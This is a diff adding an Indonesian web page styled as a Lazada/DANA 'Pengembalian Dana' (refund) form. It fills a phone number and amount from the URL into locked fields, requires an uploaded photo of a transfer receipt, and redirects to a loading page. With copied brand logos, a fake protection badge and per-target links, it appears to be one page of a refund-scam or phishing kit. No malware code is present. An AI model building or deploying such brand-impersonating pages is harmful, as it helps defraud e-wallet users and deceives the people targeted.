@@ -1,0 +1,547 @@
+<!DOCTYPE html><html lang="id">
+<head>
+    <meta charset="UTF-8"><meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+>
+
+<title>Pengembalian Dana</title>
+
+<link
+    rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+>
+
+<link rel="stylesheet" href="pengembalian.css">
+
+</head><body><div class="container"><!-- =========================
+     LOGO
+========================== -->
+
+<div class="logo-wrap">
+
+    <img
+        src="assets/lazadax.png"
+        class="logo left-logo"
+        alt="Lazada"
+    >
+
+    <div class="logo-divider"></div>
+
+    <img
+        src="assets/logo-danaa.png"
+        class="logo right-logo"
+        alt="DANA"
+    >
+
+</div>
+
+
+<!-- =========================
+     TITLE
+========================== -->
+
+<div class="title-box">
+
+    <h2>Pengembalian Dana</h2>
+
+    <p>
+        Silakan periksa data pengembalian dana
+        dan unggah bukti
+    </p>
+
+</div>
+
+
+<!-- =========================
+     FORM
+========================== -->
+
+<form id="returnForm">
+
+    <!-- NOMOR DANA -->
+
+    <div class="input-group">
+
+        <label>
+            Nomor Rekening DANA
+        </label>
+
+        <div class="locked-input">
+
+            <div class="locked-icon">
+                <i class="fa-solid fa-wallet"></i>
+            </div>
+
+            <input
+                type="text"
+                id="phone"
+                readonly
+                tabindex="-1"
+            >
+
+            <i class="fa-solid fa-lock lock-icon"></i>
+
+        </div>
+
+    </div>
+
+
+    <!-- NOMINAL -->
+
+    <div class="input-group">
+
+        <label>
+            Nominal Pengembalian
+        </label>
+
+        <div class="locked-input nominal-input">
+
+            <div class="locked-icon">
+                <i class="fa-solid fa-money-bill-wave"></i>
+            </div>
+
+            <input
+                type="text"
+                id="nominal"
+                readonly
+                tabindex="-1"
+            >
+
+            <i class="fa-solid fa-lock lock-icon"></i>
+
+        </div>
+
+    </div>
+
+
+    <!-- INFO -->
+
+    <div class="info-box">
+
+        <div class="info-icon">
+            <i class="fa-solid fa-circle-info"></i>
+        </div>
+
+        <div class="info-text">
+
+            <strong>Periksa kembali data</strong>
+
+            <p>
+                Nomor DANA dan nominal pengembalian
+                sudah ditentukan dan tidak dapat diubah.
+            </p>
+
+        </div>
+
+    </div>
+
+
+    <!-- =========================
+         UPLOAD BUKTI
+    ========================== -->
+
+    <div class="photo-box">
+
+        <label>
+            Unggah Bukti
+        </label>
+
+        <div
+            class="photo-preview"
+            id="photoPreview"
+            role="button"
+            tabindex="0"
+        >
+
+            <div class="upload-icon">
+                <i class="fa-solid fa-cloud-arrow-up"></i>
+            </div>
+
+            <p id="uploadText">
+                Ketuk untuk memilih foto bukti
+            </p>
+
+            <small>
+                JPG, PNG atau WEBP
+            </small>
+
+        </div>
+
+        <input
+            type="file"
+            id="photoInput"
+            name="photo"
+            accept="image/jpeg,image/png,image/webp"
+            hidden
+        >
+
+    </div>
+
+
+    <!-- =========================
+         BUTTON
+    ========================== -->
+
+    <button
+        class="btn-submit"
+        type="submit"
+        id="submitBtn"
+    >
+
+        <span>Lanjutkan</span>
+
+    </button>
+
+
+    <!-- PROTECTION -->
+
+    <div class="protected">
+
+        <span>Dilindungi oleh</span>
+
+        <span>|</span>
+
+        <img
+            src="assets/protection.png"
+            alt="Logo"
+        >
+
+    </div>
+
+</form>
+
+</div><!-- =========================
+     CONFIRMATION POPUP
+========================== --><div
+    class="glass-alert"
+    id="glassAlert"
+    aria-hidden="true"
+><div class="glass-card">
+
+    <div class="glass-icon">
+
+        <i class="fa-solid fa-check"></i>
+
+    </div>
+
+
+    <h3>
+        Pastikan Data Sudah Benar
+    </h3>
+
+
+    <p>
+        Pastikan nomor DANA, nominal pengembalian,
+        dan bukti transfer yang Anda masukkan
+        sudah benar dan sesuai.
+    </p>
+
+
+    <div class="confirm-data">
+
+        <div class="confirm-row">
+
+            <span>
+                Nomor DANA
+            </span>
+
+            <strong id="confirmPhone">
+                -
+            </strong>
+
+        </div>
+
+
+        <div class="confirm-row">
+
+            <span>
+                Nominal
+            </span>
+
+            <strong id="confirmNominal">
+                -
+            </strong>
+
+        </div>
+
+    </div>
+
+
+    <button
+        id="alertBtn"
+        type="button"
+    >
+
+        Lanjut
+
+    </button>
+
+
+    <button
+        id="cancelBtn"
+        type="button"
+        class="cancel-btn"
+    >
+
+        Periksa Kembali
+
+    </button>
+
+</div>
+
+</div><script>
+
+/* =========================
+   AMBIL DATA DARI URL
+========================= */
+
+const pathParts =
+    window.location.pathname
+        .split("/")
+        .filter(Boolean);
+
+
+/*
+    Format:
+
+    /pengembalian/08123456789/100.000
+
+    pathParts[0] = pengembalian
+    pathParts[1] = nomor
+    pathParts[2] = nominal
+*/
+
+const phone =
+    decodeURIComponent(pathParts[1] || "");
+
+const nominal =
+    decodeURIComponent(pathParts[2] || "");
+
+
+/* =========================
+   ELEMENT
+========================= */
+
+const phoneInput =
+    document.getElementById("phone");
+
+const nominalInput =
+    document.getElementById("nominal");
+
+const form =
+    document.getElementById("returnForm");
+
+const photoInput =
+    document.getElementById("photoInput");
+
+const photoPreview =
+    document.getElementById("photoPreview");
+
+const uploadText =
+    document.getElementById("uploadText");
+
+const glassAlert =
+    document.getElementById("glassAlert");
+
+const alertBtn =
+    document.getElementById("alertBtn");
+
+const cancelBtn =
+    document.getElementById("cancelBtn");
+
+const confirmPhone =
+    document.getElementById("confirmPhone");
+
+const confirmNominal =
+    document.getElementById("confirmNominal");
+
+
+/* =========================
+   TAMPILKAN DATA
+========================= */
+
+phoneInput.value =
+    phone || "-";
+
+
+/*
+    Kalau URL sudah berisi 100.000,
+    tampilkan sebagai Rp100.000
+*/
+
+if (nominal) {
+
+    if (
+        nominal.toLowerCase().startsWith("rp")
+    ) {
+
+        nominalInput.value =
+            nominal;
+
+    } else {
+
+        nominalInput.value =
+            "Rp" + nominal;
+
+    }
+
+} else {
+
+    nominalInput.value =
+        "-";
+
+}
+
+
+/* =========================
+   UPLOAD FOTO
+========================= */
+
+photoPreview.addEventListener(
+    "click",
+    () => {
+
+        photoInput.click();
+
+    }
+);
+
+
+photoPreview.addEventListener(
+    "keydown",
+    (event) => {
+
+        if (
+            event.key === "Enter" ||
+            event.key === " "
+        ) {
+
+            event.preventDefault();
+
+            photoInput.click();
+
+        }
+
+    }
+);
+
+
+photoInput.addEventListener(
+    "change",
+    () => {
+
+        const file =
+            photoInput.files[0];
+
+        if (!file) return;
+
+
+        uploadText.textContent =
+            file.name;
+
+
+        photoPreview.classList.add(
+            "has-file"
+        );
+
+    }
+);
+
+
+/* =========================
+   FORM SUBMIT
+========================= */
+
+form.addEventListener(
+    "submit",
+    (event) => {
+
+        event.preventDefault();
+
+
+        /* Wajib upload bukti */
+
+        if (!photoInput.files.length) {
+
+            photoPreview.classList.add(
+                "error"
+            );
+
+            uploadText.textContent =
+                "Silakan pilih bukti transfer terlebih dahulu";
+
+            return;
+
+        }
+
+
+        /* DATA UNTUK POPUP */
+
+        confirmPhone.textContent =
+            phone || "-";
+
+        confirmNominal.textContent =
+            nominalInput.value || "-";
+
+
+        /* TAMPILKAN POPUP */
+
+        glassAlert.classList.add(
+            "show"
+        );
+
+        glassAlert.setAttribute(
+            "aria-hidden",
+            "false"
+        );
+
+        document.body.classList.add(
+            "popup-open"
+        );
+
+    }
+);
+
+
+/* =========================
+   BATAL
+========================= */
+
+cancelBtn.addEventListener(
+    "click",
+    () => {
+
+        glassAlert.classList.remove(
+            "show"
+        );
+
+        glassAlert.setAttribute(
+            "aria-hidden",
+            "true"
+        );
+
+        document.body.classList.remove(
+            "popup-open"
+        );
+
+    }
+);
+
+
+/* =========================
+   LANJUT KE LOADING
+========================= */
+
+alertBtn.addEventListener(
+    "click",
+    () => {
+
+        window.location.href =
+            "loading.html";
+
+    }
+);
+
+</script></body>
+</html>
